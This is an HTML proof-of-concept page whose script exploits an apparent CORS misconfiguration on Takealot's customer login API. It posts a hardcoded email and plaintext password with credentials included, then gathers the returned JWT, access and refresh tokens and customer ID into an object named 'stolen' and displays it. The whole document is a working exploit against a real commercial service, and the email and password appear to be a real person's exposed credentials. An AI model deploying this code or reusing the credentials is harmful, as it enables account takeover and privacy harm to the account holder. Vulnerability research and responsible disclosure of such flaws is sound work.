<!DOCTYPE html>
<html>
<head>
  <title>Takealot CORS PoC</title>
</head>
<body>
<h1>Takealot CORS PoC 1.0</h1>
<pre id="output">Loading...</pre>
<script>
  fetch("https://api.takealot.com/rest/v-1-16-0/customers/login?section_id=customer_login", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "text/plain"
    },
    body: JSON.stringify({
      email: "bettridgeconnor@gmail.com",
      password: "Connor11connor11"
    })
  })
  .then(r => r.json())
  .then(data => {
    const stolen = {
      jwt: data.auth_info?.jwt,
      access_token: data.auth_info?.access_token,
      refresh_token: data.auth_info?.refresh_token,
      customer_id: data.auth_info?.customer_id,
      email: data.auth_info?.email
    }
    document.getElementById("output").innerText = JSON.stringify(stolen, null, 2)
  })
  .catch(err => {
    document.getElementById("output").innerText = "Error: " + err
  })
</script>
</body>
</html>
